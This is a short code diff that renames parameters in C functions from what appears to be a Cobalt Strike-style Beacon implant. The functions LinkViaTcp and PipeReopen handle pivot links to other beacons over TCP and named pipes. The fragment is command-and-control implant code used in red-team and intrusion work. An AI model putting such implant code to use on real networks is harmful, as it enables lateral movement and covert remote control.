@@ -109,12 +109,12 @@ SOCKET LinkViaTcpConnect(char* target, short port)
 #define PIVOT_HINT_PROTO_PIPE 0
 #define PIVOT_HINT_PROTO_TCP 0x100000
 
-void LinkViaTcp(char* data, int length)
+void LinkViaTcp(char* buffer, int length)
 {
 	int timeout = GetTickCount() + 15000;
 
 	datap parser;
-	BeaconDataParse(&parser, data, length);
+	BeaconDataParse(&parser, buffer, length);
 	short port = BeaconDataShort(&parser);
 	char* target = BeaconDataBuffer(&parser);
 	NetworkInit();
@@ -137,10 +137,10 @@ void LinkViaTcp(char* data, int length)
 	BeaconErrorD(ERROR_CONNECT_TO_TARGET_FAILED, error);	
 }
 
-void PipeReopen(char* buffer, int size)
+void PipeReopen(char* buffer, int length)
 {
 	datap parser;
-	BeaconDataParse(&parser, buffer, size);
+	BeaconDataParse(&parser, buffer, length);
 	int bid = BeaconDataInt(&parser);
 	for (int i = 0; i < MAX_LINKS; i++)
 	{
